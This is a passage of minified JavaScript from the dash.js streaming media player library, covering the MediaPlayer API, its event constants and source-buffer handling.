0,H=void 0,B=void 0;return F={initialize:function(){O=NaN,Q=!(ja=!1),x(),h.on(l.default.STREAMS_COMPOSED,N,this),h.on(l.default.PLAYBACK_STARTED,L,this),h.on(l.default.PLAYBACK_PAUSED,G,this),h.on(l.default.INTERNAL_MANIFEST_LOADED,I,this)},setManifest:function(A){E(A)},refreshManifest:J,setConfig:function(A){A&&(A.manifestModel&&(aa=A.manifestModel),A.adapter&&(ma=A.adapter),A.manifestLoader&&(W=A.manifestLoader),A.errHandler&&(H=A.errHandler),A.settings&&(B=A.settings))},reset:function(){h.off(l.default.PLAYBACK_STARTED,L,this),h.off(l.default.PLAYBACK_PAUSED,G,this),h.off(l.default.STREAMS_COMPOSED,N,this),h.off(l.default.INTERNAL_MANIFEST_LOADED,I,this),O=NaN,Q=!(ja=!1),x()}},P=(0,g.default)(w).getInstance().getLogger(F),F}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(46)),l=v(u(54)),f=v(u(47)),g=v(u(45)),t=v(u(51)),r=v(u(61));m.__dashjs_factory_name="ManifestUpdater",M.default=f.default.getClassFactory(m),da.exports=M.default},{45:45,46:46,47:47,51:51,54:54,61:61}],100:[function(u,da,M){function v(C){return C&&C.__esModule?C:{default:C}}function m(){function C(){return!!$a&&!!kc.getElement()}function fa(){return(0,Y.getVersionString)()}function qa(){if(!tb)throw"You must first call initialize() and set a valid source and view before calling this method";return Sb.isPaused()}function va(Ia){var vb=ac.getCurrentDVRInfo();if(!vb)return 0;var Hb=Sb.getLiveDelay();return(Ia=vb.range.start+Ia)>vb.range.end-Hb&&(Ia=vb.range.end-Hb),Ia}function xa(Ia){if(!tb)throw"You must first call initialize() and set a valid source and view before calling this method";var vb,Hb=Ga().currentTime;return void 0!==Ia?Hb=Kb.getTimeRelativeToStreamId(Hb,Ia):Sb.getIsDynamic()&&(Hb=null===(vb=ac.getCurrentDVRInfo())?0:za()-(vb.range.end-vb.time)),Hb}function za(){if(!tb)throw"You must first call initialize() and set a valid source and view before calling this method";var Ia=Ga().duration;if(Sb.getIsDynamic()){var vb;if(!(Ia=ac.getCurrentDVRInfo()))return 0;Ia=(vb=Ia.range.end-Ia.range.start)<Ia.manifestInfo.DVRWindowSize?vb:Ia.manifestInfo.DVRWindowSize}return Ia}function Ca(Ia){(0,ba.checkParameterType)(Ia,"boolean"),Eb=Ia}function Ba(){pc.restoreDefaultUTCTimingSources()}function Ga(){if(!kc.getElement())throw"You must first call attachView() to set the video element before calling this method";return kc.getElement()}function Ra(Ia){if(!Ka)throw"MediaPlayer not initialized!";kc.setElement(Ia),Ia&&(Pa(),function(){if(!Qb){var Hb,vb=Na.MetricsReporting;"function"==typeof vb&&(Hb=vb(ib).create(),Qb=Hb.createMetricsReporting({debug:Ab,eventBus:mb,mediaElement:Ga(),adapter:oc,dashMetrics:ac,events:ma.default,constants:l.default,metricsConstants:g.default}))}}(),function(){if(!Vb){var vb=Na.MssHandler;"function"==typeof vb&&(W.default.extend(vb.errors),Vb=vb(ib).create({eventBus:mb,mediaPlayerModel:pc,dashMetrics:ac,manifestModel:hc,playbackController:Sb,streamController:Kb,protectionController:Ib,baseURLController:ob,errHandler:Xa,events:ma.default,constants:l.default,debug:Ab,initSegmentType:ia.HTTPRequest.INIT_SEGMENT_TYPE,BASE64:S.default,ISOBoxer:V.default,settings:Db}))}}(),Kb&&Kb.switchToVideoElement()),tb&&bb(),qb()}function La(Ia){if(!Fa)throw"You must first call initialize() and set a source before calling this method";var vb=Kb.getActiveStreamInfo();return Bb.getTracksFor(Ia,vb)}function Ya(Ia){if(!Ka)throw"MediaPlayer not initialized!";"string"==typeof Ia&&ab.initialize(Ia),$a=Ia,(Fa||tb)&&bb(),C()&&qb()}function hb(){if(!Fa)throw"You must first call initialize() and set a source before calling this method";var Ia=Kb.getActiveStreamInfo();return Ia?Kb.getStreamById(Ia.id):null}function bb(){Fa=tb=!1,oc.reset(),Kb.reset(),Sb.reset(),Sa.reset(),Bb.reset(),cc.reset(),Ib&&(Db.get().streaming.keepProtectionMediaKeys?Ib.stop():(Ib.reset(),Ib=null,Pa())),xc.reset()}function Da(){return(0,J.default)(ib).create({debug:Ab,errHandler:Xa,dashMetrics:ac,mediaPlayerModel:pc,requestModifier:(0,L.default)(ib).getInstance(),mssHandler:Vb,settings:Db})}function Pa(){if(Ib)return Ib;var Ia=Na.Protection;if("function"!=typeof Ia)return null;var vb=Ia(ib).create();return ma.default.extend(Ia.events),H.default.extend(Ia.events,{publicOnly:!0}),W.default.extend(Ia.errors),lb=lb||(0,D.default)(ib).getInstance(),Ib=vb.createProtectionSystem({debug:Ab,errHandler:Xa,videoModel:kc,capabilities:lb,eventBus:mb,events:ma.default,BASE64:S.default,constants:l.default})}function eb(){if(!Ka)throw"MediaPlayer not initialized!";if(Zb)return Zb;var Ia=Na.OfflineController;if("function"!=typeof Ia)return null;ma.default.extend(Ia.events),H.default.extend(Ia.events,{publicOnly:!0}),W.default.extend(Ia.errors);var vb=Da(),Hb=(0,ha.default)(ib).create();return Hb.setConfig({manifestModel:hc,adapter:oc,manifestLoader:vb,errHandler:Xa}),Zb=Ia(ib).create({debug:Ab,manifestUpdater:Hb,baseURLController:ob,manifestLoader:vb,manifestModel:hc,mediaPlayerModel:pc,abrController:Sa,playbackController:Sb,adapter:oc,errHandler:Xa,dashMetrics:ac,timelineConverter:nb,schemeLoaderFactory:rb,eventBus:mb,events:ma.default,errors:W.default,constants:l.default,settings:Db,dashConstants:f.default,urlUtils:(0,ka.default)(ib).getInstance()})}function Ta(Ia){var vb=ac.getCurrentDVRInfo();return vb?Ia+(vb.manifestInfo.availableFrom.getTime()/1e3+vb.range.start):0}function qb(){var Ia;Zb&&Zb.resetRecords(),!Fa&&$a&&(Fa=!0,Za.info("Streaming Initialized"),Ia=Da(),Kb=Kb||(0,r.default)(ib).getInstance(),Bb.setConfig({domStorage:Fb}),Kb.setConfig({capabilities:lb,manifestLoader:Ia,manifestModel:hc,mediaPlayerModel:pc,protectionController:Ib,adapter:oc,dashMetrics:ac,errHandler:Xa,timelineConverter:nb,videoModel:kc,playbackController:Sb,abrController:Sa,mediaController:Bb,textController:cc,settings:Db,baseURLController:ob}),Sb.setConfig({streamController:Kb,dashMetrics:ac,mediaPlayerModel:pc,adapter:oc,videoModel:kc,timelineConverter:nb,uriFragmentModel:ab,settings:Db}),Sa.setConfig({streamController:Kb,domStorage:Fb,mediaPlayerModel:pc,dashMetrics:ac,adapter:oc,videoModel:kc,settings:Db}),Sa.createAbrRulesCollection(),cc.setConfig({errHandler:Xa,manifestModel:hc,adapter:oc,mediaController:Bb,streamController:Kb,videoModel:kc}),xc.setConfig({abrController:Sa,dashMetrics:ac,playbackController:Sb}),Kb.initialize(Eb,ua),xc.initialize(),"string"==typeof $a?Kb.load($a):Kb.loadWithManifest($a)),!tb&&C()&&(tb=!0,Za.info("Playback Initialized"))}var db,ib=this.context,mb=(0,aa.default)(ib).getInstance(),Db=(0,A.default)(ib).getInstance(),Ab=(0,ja.default)(ib).getInstance({settings:Db}),Za=void 0,$a=void 0,ua=void 0,Ka=void 0,Fa=void 0,tb=void 0,Eb=void 0,Sa=void 0,rb=void 0,nb=void 0,Bb=void 0,Ib=void 0,Qb=void 0,Vb=void 0,Zb=void 0,oc=void 0,pc=void 0,Xa=void 0,ob=void 0,lb=void 0,Kb=void 0,Sb=void 0,ac=void 0,hc=void 0,xc=void 0,kc=void 0,cc=void 0,ab=void 0,Fb=void 0,Wb=void 0;return db={initialize:function(Ia,vb,Hb){lb=lb||(0,D.default)(ib).getInstance(),Xa=(0,E.default)(ib).getInstance(),lb.supportsMediaSource()?Ka||(Ka=!0,nb=(0,pa.default)(ib).getInstance(),Sa||(Sa=(0,F.default)(ib).getInstance()).setConfig({settings:Db}),rb=rb||(0,P.default)(ib).getInstance(),Sb=Sb||(0,t.default)(ib).getInstance(),Bb=Bb||(0,x.default)(ib).getInstance(),Kb=Kb||(0,r.default)(ib).getInstance(),oc=(0,na.default)(ib).getInstance(),hc=(0,w.default)(ib).getInstance(),xc=(0,R.default)(ib).getInstance(),ac=(0,T.default)(ib).getInstance({settings:Db}),cc=(0,G.default)(ib).getInstance(),Fb=(0,Q.default)(ib).getInstance({settings:Db}),oc.setConfig({constants:l.default,cea608parser:p.default,errHandler:Xa,BASE64:S.default}),(ob=ob||(0,z.default)(ib).create()).setConfig({adapter:oc}),(Wb=(0,Z.default)(ib).getInstance({dashMetrics:ac,mediaPlayerModel:pc,errHandler:Xa,baseURLController:ob,events:ma.default,eventBus:mb,debug:Ab,boxParser:(0,la.default)(ib).getInstance(),requestModifier:(0,L.default)(ib).getInstance(),errors:W.default})).initialize(),Ba(),Ca(void 0===Hb||Hb),eb(),Ia&&Ra(Ia),vb&&Ya(vb),Za.info("[dash.js "+fa()+"] MediaPlayer has been initialized")):Xa.error(new oa.default(W.default.CAPABILITY_MEDIASOURCE_ERROR_CODE,W.default.CAPABILITY_MEDIASOURCE_ERROR_MESSAGE))},setConfig:function(Ia){Ia&&(Ia.capabilities&&(lb=Ia.capabilities),Ia.streamController&&(Kb=Ia.streamController),Ia.playbackController&&(Sb=Ia.playbackController),Ia.mediaPlayerModel&&(pc=Ia.mediaPlayerModel),Ia.abrController&&(Sa=Ia.abrController),Ia.schemeLoaderFactory&&(rb=Ia.schemeLoaderFactory),Ia.mediaController&&(Bb=Ia.mediaController),Ia.settings&&(Db=Ia.settings))},on:function(Ia,vb,Hb){mb.on(Ia,vb,Hb)},off:function(Ia,vb,Hb){mb.off(Ia,vb,Hb)},extend:function(Ia,vb,Hb){B.default.extend(Ia,vb,Hb,ib)},attachView:Ra,attachSource:Ya,isReady:C,preload:function(){if(kc.getElement()||Fa)return!1;if(!$a)throw"You must first call attachSource() with a valid source before calling this method";qb()},play:function(){if(!tb)throw"You must first call initialize() and set a valid source and view before calling this method";(!Eb||qa()&&tb)&&Sb.play()},isPaused:qa,pause:function(){if(!tb)throw"You must first call initialize() and set a valid source and view before calling this method";Sb.pause()},isSeeking:function(){if(!tb)throw"You must first call initialize() and set a valid source and view before calling this method";return Sb.isSeeking()},isDynamic:function(){if(!tb)throw"You must first call initialize() and set a valid source and view before calling this method";return Sb.getIsDynamic()},seek:function(Ia){if(!tb)throw"You must first call initialize() and set a valid source and view before calling this method";if((0,ba.checkParameterType)(Ia,"number"),isNaN(Ia))throw l.default.BAD_ARGUMENT_ERROR;Ia=Sb.getIsDynamic()?va(Ia):Ia,Sb.seek(Ia)},setPlaybackRate:function(Ia){Ga().playbackRate=Ia},getPlaybackRate:function(){return Ga().playbackRate},setMute:function(Ia){(0,ba.checkParameterType)(Ia,"boolean"),Ga().muted=Ia},isMuted:function(){return Ga().muted},setVolume:function(Ia){if("number"!=typeof Ia||isNaN(Ia)||0>Ia||1<Ia)throw l.default.BAD_ARGUMENT_ERROR;Ga().volume=Ia},getVolume:function(){return Ga().volume},time:xa,duration:za,timeAsUTC:function(){if(!tb)throw"You must first call initialize() and set a valid source and view before calling this method";return 0>xa()?NaN:Ta(xa())},durationAsUTC:function(){if(!tb)throw"You must first call initialize() and set a valid source and view before calling this method";return Ta(za())},getActiveStream:hb,getDVRWindowSize:function(){var Ia=ac.getCurrentDVRInfo();return Ia?Ia.manifestInfo.DVRWindowSize:0},getDVRSeekOffset:va,convertToTimeCode:function(Ia){Ia=Math.max(Ia,0);var vb=Math.floor(Ia/3600),Hb=Math.floor(Ia%3600/60);return Ia=Math.floor(Ia%3600%60),(0===vb?"":10>vb?"0"+vb.toString()+":":vb.toString()+":")+(10>Hb?"0"+Hb.toString():Hb.toString())+":"+(10>Ia?"0"+Ia.toString():Ia.toString())},formatUTC:function(Ia,vb,Hb){var wc=!(3>=arguments.length||void 0===arguments[3])&&arguments[3],Lc=new Date(1e3*Ia),Fc=Lc.toLocaleDateString(vb);return Lc=Lc.toLocaleTimeString(vb,{hour12:Hb}),wc?Lc+" "+Fc:Lc},getVersion:fa,getDebug:function(){return Ab},getBufferLength:function(Ia){var vb,Hb=[l.default.VIDEO,l.default.AUDIO,l.default.FRAGMENTED_TEXT];return Ia?-1===Hb.indexOf(Ia)?(Za.warn("getBufferLength requested for invalid type"),NaN):(vb=ac.getCurrentBufferLevel(Ia))||NaN:(vb=Hb.map((function(wc){return 0<La(wc).length?ac.getCurrentBufferLevel(wc):Number.MAX_VALUE})).reduce((function(wc,Lc){return Math.min(wc,Lc)})))===Number.MAX_VALUE?NaN:vb},getTTMLRenderingDiv:function(){return kc?kc.getTTMLRenderingDiv():null},getVideoElement:Ga,getSource:function(){if(!$a)throw"You must first call attachSource() with a valid source before calling this method";return $a},getCurrentLiveLatency:function(){if(!Ka)throw"MediaPlayer not initialized!";return tb?Sb.getCurrentLiveLatency():NaN},getTopBitrateInfoFor:function(Ia){if(!Fa)throw"You must first call initialize() and set a source before calling this method";return Sa.getTopBitrateInfoFor(Ia)},setAutoPlay:Ca,getAutoPlay:function(){return Eb},getDashMetrics:function(){return ac},getQualityFor:function(Ia){if(!Fa)throw"You must first call initialize() and set a source before calling this method";return Ia!==l.default.IMAGE?Sa.getQualityFor(Ia):(Ia=hb())&&(Ia=Ia.getThumbnailController())?Ia.getCurrentTrackIndex():-1},setQualityFor:function(Ia,vb){if(!Fa)throw"You must first call initialize() and set a source before calling this method";if(Ia===l.default.IMAGE){var Hb=hb();if(!Hb)return;(Hb=Hb.getThumbnailController())&&Hb.setTrackByIndex(vb)}Sa.setPlaybackQuality(Ia,Kb.getActiveStreamInfo(),vb)},updatePortalSize:function(){Sa.setElementSize(),Sa.setWindowResizeEventCalled(!0)},setTextDefaultLanguage:function(Ia){Za.warn('setTextDefaultLanguage is deprecated and will be removed in version 3.2.0. Please use setInitialMediaSettingsFor("fragmentedText", { lang: lang }) instead'),void 0===cc&&(cc=(0,G.default)(ib).getInstance()),cc.setTextDefaultLanguage(Ia)},getTextDefaultLanguage:function(){return Za.warn('getTextDefaultLanguage is deprecated and will be removed in version 3.2.0. Please use getInitialMediaSettingsFor("fragmentedText").lang instead'),void 0===cc&&(cc=(0,G.default)(ib).getInstance()),cc.getTextDefaultLanguage()},setTextDefaultEnabled:function(Ia){void 0===cc&&(cc=(0,G.default)(ib).getInstance()),cc.setTextDefaultEnabled(Ia)},getTextDefaultEnabled:function(){return void 0===cc&&(cc=(0,G.default)(ib).getInstance()),cc.getTextDefaultEnabled()},enableText:function(Ia){void 0===cc&&(cc=(0,G.default)(ib).getInstance()),cc.enableText(Ia)},enableForcedTextStreaming:function(Ia){void 0===cc&&(cc=(0,G.default)(ib).getInstance()),cc.enableForcedTextStreaming(Ia)},isTextEnabled:function(){return void 0===cc&&(cc=(0,G.default)(ib).getInstance()),cc.isTextEnabled()},setTextTrack:function(Ia){if(!tb)throw"You must first call initialize() and set a valid source and view before calling this method";void 0===cc&&(cc=(0,G.default)(ib).getInstance()),cc.setTextTrack(Ia)},getBitrateInfoListFor:function(Ia){if(!Fa)throw"You must first call initialize() and set a source before calling this method";var vb=hb();return vb?vb.getBitrateListFor(Ia):[]},getStreamsFromManifest:function(Ia){if(!Fa)throw"You must first call initialize() and set a source before calling this method";return oc.getStreamsInfo(Ia)},getTracksFor:La,getTracksForTypeFromManifest:function(Ia,vb,Hb){if(!Fa)throw"You must first call initialize() and set a source before calling this method";return(Hb=Hb||oc.getStreamsInfo(vb,1)[0])?oc.getAllMediaInfoForType(Hb,Ia,vb):[]},getCurrentTrackFor:function(Ia){if(!Fa)throw"You must first call initialize() and set a source before calling this method";var vb=Kb.getActiveStreamInfo();return Bb.getCurrentTrackFor(Ia,vb)},setInitialMediaSettingsFor:function(Ia,vb){if(!Ka)throw"MediaPlayer not initialized!";Bb.setInitialSettings(Ia,vb),Ia===l.default.FRAGMENTED_TEXT&&cc.setInitialSettings(vb)},getInitialMediaSettingsFor:function(Ia){if(!Ka)throw"MediaPlayer not initialized!";return Bb.getInitialSettings(Ia)},setCurrentTrack:function(Ia){if(!Fa)throw"You must first call initialize() and set a source before calling this method";Bb.setTrack(Ia)},getTrackSwitchModeFor:function(Ia){if(!Ka)throw"MediaPlayer not initialized!";return Bb.getSwitchMode(Ia)},setTrackSwitchModeFor:function(Ia,vb){if(!Ka)throw"MediaPlayer not initialized!";Bb.setSwitchMode(Ia,vb)},setSelectionModeForInitialTrack:function(Ia){if(!Ka)throw"MediaPlayer not initialized!";Bb.setSelectionModeForInitialTrack(Ia)},getSelectionModeForInitialTrack:function(){if(!Ka)throw"MediaPlayer not initialized!";return Bb.getSelectionModeForInitialTrack()},addABRCustomRule:function(Ia,vb,Hb){pc.addABRCustomRule(Ia,vb,Hb)},removeABRCustomRule:function(Ia){pc.removeABRCustomRule(Ia)},removeAllABRCustomRule:function(){pc.removeABRCustomRule()},getAverageThroughput:function(Ia){var vb=Sa.getThroughputHistory();return vb?vb.getAverageThroughput(Ia):0},retrieveManifest:function(Ia,vb){var Hb=Da(),wc=this;mb.on(ma.default.INTERNAL_MANIFEST_LOADED,(function dc(Fc){Fc.error?vb(null,Fc.error):vb(Fc.manifest),mb.off(ma.default.INTERNAL_MANIFEST_LOADED,dc,wc),Hb.reset()}),wc),ab.initialize(Ia),Hb.load(Ia)},addUTCTimingSource:function(Ia,vb){pc.addUTCTimingSource(Ia,vb)},removeUTCTimingSource:function(Ia,vb){pc.removeUTCTimingSource(Ia,vb)},clearDefaultUTCTimingSources:function(){pc.clearDefaultUTCTimingSources()},restoreDefaultUTCTimingSources:Ba,setXHRWithCredentialsForType:function(Ia,vb){pc.setXHRWithCredentialsForType(Ia,vb)},getXHRWithCredentialsForType:function(Ia){return pc.getXHRWithCredentialsForType(Ia)},getProtectionController:Pa,attachProtectionController:function(Ia){Ib=Ia},setProtectionData:function(Ia){ua=Ia,Kb&&Kb.setProtectionData(ua)},displayCaptionsOnTop:function(Ia){var vb=(0,I.default)(ib).getInstance();vb.setConfig({videoModel:kc}),vb.initialize(),vb.setDisplayCConTop(Ia)},attachTTMLRenderingDiv:function(Ia){if(!kc.getElement())throw"You must first call attachView() to set the video element before calling this method";kc.setTTMLRenderingDiv(Ia)},getCurrentTextTrackIndex:function(){var Ia=NaN;return cc&&(Ia=cc.getCurrentTrackIdx()),Ia},provideThumbnail:function(Ia,vb){if("function"==typeof vb){if(!(0>Ia)){var Hb=Sb.getIsDynamic()?va(Ia):Ia,wc=Kb.getStreamForTime(Hb);if(null!==wc&&(Ia=wc.getThumbnailController()))return Hb=Kb.getTimeRelativeToStreamId(Hb,wc.getId()),Ia.provide(Hb,vb)}vb(null)}},getDashAdapter:function(){return oc},getOfflineController:eb,getSettings:function(){return Db.get()},updateSettings:function(Ia){Db.update(Ia)},resetSettings:function(){Db.reset()},reset:function(){Ya(null),Ra(null),ua=null,Ib&&(Ib.reset(),Ib=null),Qb&&(Qb.reset(),Qb=null),Wb.reset(),Db.reset(),Zb&&(Zb.reset(),Zb=null)}},Za=Ab.getLogger(db),Eb=!(Fa=tb=Ka=!1),Wb=oc=ua=Zb=Ib=null,ma.default.extend(H.default),pc=(0,h.default)(ib).getInstance(),kc=(0,O.default)(ib).getInstance(),ab=(0,N.default)(ib).getInstance(),db}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(2)),l=v(u(108)),f=v(u(61)),g=v(u(109)),t=v(u(119)),r=v(u(121)),x=v(u(117)),z=v(u(112)),J=v(u(98)),E=v(u(212)),D=v(u(207)),I=v(u(202)),L=v(u(217)),G=v(u(200)),N=v(u(153)),w=v(u(150)),h=v(u(151)),F=v(u(111)),P=v(u(157)),O=v(u(154)),R=v(u(148)),Q=v(u(209)),ja=v(u(45)),W=v(u(51)),aa=v(u(46)),ma=v(u(54)),H=v(u(101)),B=v(u(47)),A=v(u(48)),Y=u(50),Z=v(u(63)),na=v(u(56)),T=v(u(58)),pa=v(u(82)),ia=u(241),S=v(u(1)),V=v(u(9)),oa=v(u(225)),ba=u(218),ha=v(u(99)),ka=v(u(220)),la=v(u(206));m.__dashjs_factory_name="MediaPlayer",(u=B.default.getClassFactory(m)).events=H.default,u.errors=W.default,B.default.updateClassFactory(m.__dashjs_factory_name,u),M.default=u,da.exports=M.default},{1:1,101:101,108:108,109:109,111:111,112:112,117:117,119:119,121:121,148:148,150:150,151:151,153:153,154:154,157:157,2:2,200:200,202:202,206:206,207:207,209:209,212:212,217:217,218:218,220:220,225:225,241:241,45:45,46:46,47:47,48:48,50:50,51:51,54:54,56:56,58:58,61:61,63:63,82:82,9:9,98:98,99:99}],101:[function(u,da,M){function v(){if(!(this instanceof v))throw new TypeError("Cannot call a class as a function");a:{for(var m=Object.getPrototypeOf(v.prototype),p="constructor",l=this,f=!0;f;){if(null===m&&(m=Function.prototype),void 0!==(f=Object.getOwnPropertyDescriptor(m,p))){if("value"in f){l=f.value;break a}if(void 0===(p=f.get))break;l=p.call(l);break a}if(null===(m=Object.getPrototypeOf(m)))break;f=!0}l=void 0}l.call(this),this.AST_IN_FUTURE="astInFuture",this.BUFFER_EMPTY="bufferStalled",this.BUFFER_LOADED="bufferLoaded",this.BUFFER_LEVEL_STATE_CHANGED="bufferStateChanged",this.ERROR="error",this.FRAGMENT_LOADING_COMPLETED="fragmentLoadingCompleted",this.FRAGMENT_LOADING_PROGRESS="fragmentLoadingProgress",this.FRAGMENT_LOADING_STARTED="fragmentLoadingStarted",this.FRAGMENT_LOADING_ABANDONED="fragmentLoadingAbandoned",this.LOG="log",this.MANIFEST_LOADED="manifestLoaded",this.METRICS_CHANGED="metricsChanged",this.METRIC_CHANGED="metricChanged",this.METRIC_ADDED="metricAdded",this.METRIC_UPDATED="metricUpdated",this.PERIOD_SWITCH_COMPLETED="periodSwitchCompleted",this.PERIOD_SWITCH_STARTED="periodSwitchStarted",this.QUALITY_CHANGE_REQUESTED="qualityChangeRequested",this.QUALITY_CHANGE_RENDERED="qualityChangeRendered",this.TRACK_CHANGE_RENDERED="trackChangeRendered",this.SOURCE_INITIALIZED="sourceInitialized",this.STREAM_INITIALIZING="streamInitializing",this.STREAM_INITIALIZED="streamInitialized",this.STREAM_TEARDOWN_COMPLETE="streamTeardownComplete",this.TEXT_TRACKS_ADDED="allTextTracksAdded",this.TEXT_TRACK_ADDED="textTrackAdded",this.TTML_PARSED="ttmlParsed",this.TTML_TO_PARSE="ttmlToParse",this.CAPTION_RENDERED="captionRendered",this.CAPTION_CONTAINER_RESIZE="captionContainerResize",this.CAN_PLAY="canPlay",this.PLAYBACK_ENDED="playbackEnded",this.PLAYBACK_ERROR="playbackError",this.PLAYBACK_NOT_ALLOWED="playbackNotAllowed",this.PLAYBACK_METADATA_LOADED="playbackMetaDataLoaded",this.PLAYBACK_PAUSED="playbackPaused",this.PLAYBACK_PLAYING="playbackPlaying",this.PLAYBACK_PROGRESS="playbackProgress",this.PLAYBACK_RATE_CHANGED="playbackRateChanged",this.PLAYBACK_SEEKED="playbackSeeked",this.PLAYBACK_SEEKING="playbackSeeking",this.PLAYBACK_SEEK_ASKED="playbackSeekAsked",this.PLAYBACK_STALLED="playbackStalled",this.PLAYBACK_STARTED="playbackStarted",this.PLAYBACK_TIME_UPDATED="playbackTimeUpdated",this.PLAYBACK_WAITING="playbackWaiting",this.MANIFEST_VALIDITY_CHANGED="manifestValidityChanged"}Object.defineProperty(M,"__esModule",{value:!0}),u=new(function(m,p){if("function"!=typeof p&&null!==p)throw new TypeError("Super expression must either be null or a function, not "+typeof p);m.prototype=Object.create(p&&p.prototype,{constructor:{value:m,enumerable:!1,writable:!0,configurable:!0}}),p&&(Object.setPrototypeOf?Object.setPrototypeOf(m,p):m.__proto__=p)}(v,((u=u(55))&&u.__esModule?u:{default:u}).default),v),M.default=u,da.exports=M.default},{55:55}],102:[function(u,da,M){function v(r,x,z){if(!r||!/^VIDEO$/i.test(r.nodeName))return null;if(r._dashjs_player)return r._dashjs_player;var J=void 0,E=r.id||r.name||"video element";if(!(x=x||[].slice.call(r.querySelectorAll("source")).filter((function(D){return D.type==l}))[0])&&r.src)(x=document.createElement("source")).src=r.src;else if(!x&&!r.src)return null;return z=z||{},(J=(0,p.default)(z).create()).initialize(r,x.src,r.autoplay),(f=f||J.getDebug().getLogger()).debug("Converted "+E+" to dash.js player and added content: "+x.src),r._dashjs_player=J}Object.defineProperty(M,"__esModule",{value:!0});var m,l,f,p=(m=u(100))&&m.__esModule?m:{default:m},g=(l="application/dash+xml",{create:v,createAll:function(r,x){var z=[],J=(x=x||document).querySelectorAll(r||"[data-dashjs-player]");for(r=0;r<J.length;r++){var E=v(J[r],null);z.push(E)}for(x=x.querySelectorAll('source[type="'+l+'"]'),r=0;r<x.length;r++){a:{for(E=x[r],J=!0;J;){if(/^VIDEO$/i.test(E.nodeName))break a;E=E.parentNode,J=!0}E=void 0}E=v(E,null),z.push(E)}return z}}),t=f=void 0;void 0!==wa&&wa&&wa.dashjs&&wa.dashjs.skipAutoCreate||void 0===wa||!wa||!wa.addEventListener||("complete"===wa.document.readyState?wa.dashjs?g.createAll():t=wa.setInterval((function(){wa.dashjs&&(wa.clearInterval(t),g.createAll())}),500):wa.addEventListener("load",(function x(){wa.removeEventListener("load",x),g.createAll()}))),M.default=g,da.exports=M.default},{100:100}],103:[function(u,da,M){function v(l){return l&&l.__esModule?l:{default:l}}function m(l){function f(E,D){z=z.filter((function(I){return!((isNaN(D)||I.start<D)&&(isNaN(E)||I.end>E))}))}var t,g=this.context,r=void 0,x=void 0,z=[],J=l;return t={getAllBufferRanges:function(){for(var E=[],D=0;D<z.length;D++){var I=z[D];0===E.length||I.start>E[E.length-1].end?E.push({start:I.start,end:I.end}):E[E.length-1].end=I.end}return D={start:function(L){return E[L].start},end:function(L){return E[L].end}},Object.defineProperty(D,"length",{get:function(){return E.length}}),D},append:function(E){x="InitializationSegment"!==E.segmentType?(z.push(E),z.sort((function(D,I){return D.start-I.start})),null):E,r.debug("PreBufferSink appended chunk s: "+E.start+"; e: "+E.end),J&&J({chunk:E})},remove:f,abort:function(){},discharge:function(E,D){var I=z.filter((function(L){return(isNaN(D)||L.start<D)&&(isNaN(E)||L.end>E)}));return x&&(I.push(x),x=null),f(E,D),I},reset:function(){z=[],J=x=null},updateTimestampOffset:function(){},hasDiscontinuitiesAfter:function(){return!1},waitForUpdateEnd:function(E){E()},getBuffer:function(){return this}},r=(0,p.default)(g).getInstance().getLogger(t),t}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(45));u=v(u(47)),m.__dashjs_factory_name="PreBufferSink",u=u.default.getClassFactory(m),M.default=u,da.exports=M.default},{45:45,47:47}],104:[function(u,da,M){function v(z){return z&&z.__esModule?z:{default:z}}function m(z,J,E,D,I){function L(){try{return W.buffered}catch(Z){return ja.error("getAllBufferRanges exception: "+Z.message),null}}function G(){var Z=this,na=this;0<B.length&&function(){function T(){var S,ba,V=L(),oa=pa;if(ba=(S=ia)&&0<S.length&&S.length<V.length)a:{for(ba=0;ba<S.length;ba++){var ha=Math.round(S.start(ba)),ka=Math.round(S.end(ba));if(ka===oa.start||ha===oa.end||oa.start>=ha&&oa.end<=ka){ba=!0;break a}}ba=!1}ba&&R.trigger(g.default.SOURCEBUFFER_REMOVE_COMPLETED,{buffer:na,from:V.end(V.length-2),to:V.start(V.length-1),unintended:!0}),0<B.length?G.call(this):(aa=!1,A&&A({chunk:pa}))}aa=!0;var pa=B[0];B.splice(0,1);var ia=[];try{0===pa.bytes.length?T.call(Z):(ia=L(),W.appendBuffer?W.appendBuffer(pa.bytes):W.append(pa.bytes,pa),P(T.bind(Z)))}catch(S){ja.fatal('SourceBuffer append failed "'+S+'"'),0<B.length?G():aa=!1,A&&A({chunk:pa,error:new l.default(S.code,S.message)})}}()}function N(){var Z;0<H.length&&(Z=H.shift(),W.updating?P(Z):(Z(),N()))}function w(){W.updating||N()}function h(){W.updating||N()}function F(){ja.error("SourceBufferSink error",J.type)}function P(Z){H.push(Z),W.updating||N()}var Q,O=this.context,R=(0,f.default)(O).getInstance(),ja=void 0,W=void 0,aa=void 0,ma=void 0,H=[],B=[],A=E,Y=!1!==D;return Q={getAllBufferRanges:L,getBuffer:function(){return W},append:function(Z){Z?(B.push(Z),aa||P(G.bind(this))):A({chunk:Z,error:new l.default(x.default.APPEND_ERROR_CODE,x.default.APPEND_ERROR_MESSAGE)})},remove:function(Z,na,T){var pa=this;P((function(){try{0<=Z&&Z<na&&(T||"ended"!==z.readyState)&&W.remove(Z,na),P((function(){R.trigger(g.default.SOURCEBUFFER_REMOVE_COMPLETED,{buffer:pa,from:Z,to:na,unintended:!1})}))}catch(ia){R.trigger(g.default.SOURCEBUFFER_REMOVE_COMPLETED,{buffer:pa,from:Z,to:na,unintended:!1,error:new l.default(ia.code,ia.message)})}}))},abort:function(){try{("open"===z.readyState||W.setTextTrack&&"ended"===z.readyState)&&W.abort()}catch(Z){ja.error('SourceBuffer append abort failed: "'+Z+'"')}B=[]},reset:function(Z){if(W){if("function"==typeof W.removeEventListener&&(W.removeEventListener("updateend",h,!1),W.removeEventListener("error",F,!1),W.removeEventListener("abort",F,!1)),clearInterval(ma),W.appendWindowEnd=1/0,!Z){try{W.getClassName&&"TextSourceBuffer"===W.getClassName()||z.removeSourceBuffer(W)}catch(na){ja.error("Failed to remove source buffer from media source.")}W=null}aa=!1}B=[],A=null},updateTimestampOffset:function(Z){W.timestampOffset===Z||isNaN(Z)||P((function(){W.timestampOffset=Z}))},hasDiscontinuitiesAfter:function(Z){try{var na=L();if(na&&1<na.length)for(var T=0,pa=na.length;T<pa;T++)if(0<T&&Z<na.start(T)&&na.start(T)>na.end(T-1)+.1)return!0}catch(ia){ja.error("hasDiscontinuities exception: "+ia.message)}return!1},waitForUpdateEnd:P},function(){ja=(0,p.default)(O).getInstance().getLogger(Q),aa=!1;var 